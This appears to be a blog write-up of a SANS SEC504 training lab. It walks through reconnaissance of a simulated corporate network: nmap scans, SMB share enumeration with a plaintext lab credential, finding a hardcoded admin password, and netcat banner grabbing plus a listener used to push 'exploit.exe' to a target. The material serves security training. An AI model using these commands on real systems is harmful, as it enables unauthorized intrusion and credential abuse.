---
layout: post
title: "SEC-504: Network Reconnaissance & Discovery"
date: 2026-01-13
categories: [Red Team, Reconnaissance]
tags: [Nmap, SMB, Netcat, Enumeration, Networking]
---

In the SANS SEC504 course, I performed comprehensive network reconnaissance against a simulated corporate network ("Falsimentis"). The goal was to map the attack surface, identify running services, and discover low-hanging fruit like open file shares.

Here is the step-by-step methodology I used.

---

## 1. Nmap Network Scanning
**Objective:** Discover live hosts and services on a subnet.

I used **Nmap**, the industry standard for network discovery, to map out the target network range.

### Step 1: Host Discovery (Ping Sweep)
First, I identified which IP addresses were active without scanning every port. This "loud" scan helps identify targets quickly.
```bash
sudo nmap -sn -n 172.30.0.1-254
```
*   `-sn`: Ping scan (no port scan).
*   `-n`: Disable DNS resolution for speed.
**Result:** Found 4 active hosts, including `172.30.0.20`.

### Step 2: Service & Version Detection
Once I identified a target (`172.30.0.20`), I scanned for open ports and the specific software versions running on them.
```bash
sudo nmap -sV -p- 172.30.0.20
```
*   `-sV`: Probe open ports to determine service/version info.
*   `-p-`: Scan ALL 65,535 ports (not just the top 1000).

**Result:** I discovered a hidden web server running on port **2430** (Venus service) and a standard MySQL database on port **3306**.

---

## 2. SMB Security Investigation
**Objective:** Enumerate and exploit insecure File Shares (SMB).

Server Message Block (SMB) is a frequent target in internal networks. I investigated a Windows server (`172.30.0.22`) to find sensitive data and access paths.

### Step 1: Listing Shares
I used `smbclient` to list the shares available on the target server, using credentials I obtained earlier in the engagement.
```bash
smbclient -L //172.30.0.22 -U "tdoudney%Falsimentis123"
```
**Result:** The output revealed a non-standard share named `IT` alongside the defaults (`C$`, `IPC$`).

### Step 2: Accessing Shares
I connected to the `IT` share to explore its contents.
```bash
smbclient //172.30.0.22/IT -U "tdoudney%Falsimentis123"
smb: \> ls
```
**Result:** I downloaded a file named `config.xml`.

### Step 3: Privilege Escalation
I inspected the contents of `config.xml`.
```bash
cat config.xml
```
**Finding:** The file contained a hardcoded password for the `Administrator` account in plain text. I was able to use these credentials to pivot to other systems.

---

## 3. Netcat: The Swiss Army Knife
**Objective:** Master raw network interaction.

While tools like Nmap are powerful, **Netcat** (`nc`) allows for raw data transfer and connection handling.

### Step 1: Banner Grabbing
I manually connected to open ports to read the service banner, which often reveals the OS or software version.
```bash
nc -nv 172.30.0.20 80
```
**Output:** I sent a `HEAD / HTTP/1.0` request and the server responded with `Server: Apache/2.4.41 (Ubuntu)`, giving me precise version info for vulnerability lookup.

### Step 2: Data Transfer
I used Netcat to transfer a file from my attacking machine to the target during a simulated post-exploitation phase, bypassing the need for SCP/FTP.

*On Receiver (Target):*
```bash
nc -nlvp 4444 > file_received.txt
```
*On Sender (Attacker):*
```bash
nc -nv 172.30.0.20 4444 < exploit.exe
```
**Takeaway:** Understanding raw socket communication is fundamental. Netcat remains one of the most versatile tools for debugging and simple backdoors.
